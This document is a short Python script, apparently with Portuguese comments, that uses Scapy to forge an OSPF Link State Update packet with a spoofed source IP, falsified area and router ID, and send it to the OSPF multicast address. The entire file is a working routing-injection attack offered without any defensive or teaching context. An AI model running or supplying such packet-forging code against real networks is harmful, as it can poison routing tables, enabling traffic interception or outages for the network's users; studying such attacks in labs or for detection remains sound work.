from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.ospf import OSPF_Hdr, OSPF_LSA_Hdr, OSPF_LSUpd

# Configurações do pacote OSPF manipulado
src_ip = "192.168.1.1"  # IP de origem falso
ospf_area = 0x00000001  # Área OSPF falsificada
router_id = "1.1.1.1"  # ID do roteador falsificado

# Construção do pacote OSPF manipulado
ospf_packet = (
    IP(src=src_ip, dst="224.0.0.5") /  # IP multicast OSPF
    OSPF_Hdr(area=ospf_area) /
    OSPF_LSUpd(lsalist=[
        OSPF_LSA_Hdr(age=1, type=1, lsid="2.2.2.2", adv_router=router_id)
    ])
)

# Envio do pacote manipulado
send(ospf_packet)
